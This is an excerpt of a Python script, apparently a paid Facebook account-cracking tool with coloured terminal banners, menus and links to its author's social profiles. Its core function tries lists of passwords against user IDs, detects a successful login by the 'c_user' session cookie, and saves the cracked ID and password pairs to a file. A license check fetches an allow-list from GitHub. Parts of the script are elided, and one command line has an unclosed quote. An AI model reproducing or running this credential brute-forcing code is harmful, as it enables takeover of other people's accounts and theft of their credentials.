...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘 \x07')
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘
 \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : 𝐜𝐲𝐛𝐞𝐫𝐫𝐚𝐟𝐢-𝟑𝟏
 \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : RENDOM
 \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-10]
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61551411116495');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61551411116495);time.sleep(1)
		group()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/cyberrafi-31');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000,50000] ')
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[REDOUPSTRICKEUR]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [REDOUPSHACK-OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/REDOUPSTRICKEUR-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/cyberrafi-31/Text/blob/main/Hacker.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=61551411116495")
        time.sleep(3.0)
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘 er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
